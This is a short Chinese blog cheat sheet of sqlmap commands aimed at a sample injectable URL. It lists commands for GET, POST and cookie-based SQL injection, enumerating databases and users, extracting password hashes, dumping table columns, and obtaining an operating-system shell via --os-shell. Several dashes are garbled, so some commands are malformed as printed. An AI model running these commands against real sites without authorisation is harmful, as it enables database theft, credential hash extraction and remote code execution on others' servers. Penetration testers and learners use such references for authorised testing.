---
title: "sqlmap常用命令"
date: "2019-10-27"
categories: 
  - "kali"
  - "linux"
  - "termux"
tags: 
  - "kali"
  - "linux"
  - "nmap"
  - "termux"
---

```
本文可直接wget得到，配合tmux使用体验更佳。（文章末尾）
```

./sqlmap.py –h     //查看帮助信息
 ./sqlmap.py –u “http://www.bigesec.com/inject.asp?id=injecthere”  //get注入
 ./sqlmap.py –u “http://www.bigesec.com/inject.asp?id=injecthere” --data “DATA”//post注入
 ./sqlmap.py –u “http://www.bigesec.com/inject.asp?id=injecthere” --cookie “COOKIE”//修改请求时的cookie
 ./sqlmap.py –u “http://www.bigesec.com/inject.asp?id=injecthere” --dbs   //列数据库
 ./sqlmap.py –u “http://www.bigesec.com/inject.asp?id=injecthere” –-users //列用户
 ./sqlmap.py –u “http://www.bigesec.com/inject.asp?id=injecthere” –-passwords //获取密码hash
 ./sqlmap.py –u “http://www.bigesec.com/inject.asp?id=injecthere” –-tables  -D DB\_NAME //列DB\_NAME的表
 ./sqlmap.py –u “http://www.bigesec.com/inject.asp?id=injecthere” –-columns –T TB\_NAME -D DB\_NAME  //读取TB\_NAME中的列
 ./sqlmap.py –u “http://www.bigesec.com/inject.asp?id=injecthere” –-dump –C C1,C2,C3 –T TB\_NAME -D DB\_NAME //读字段C1,C2,C3数据
 ./sqlmap.py –u “http://www.bigesec.com/inject.asp?id=injecthere” –-os-shell  //取得一个shell
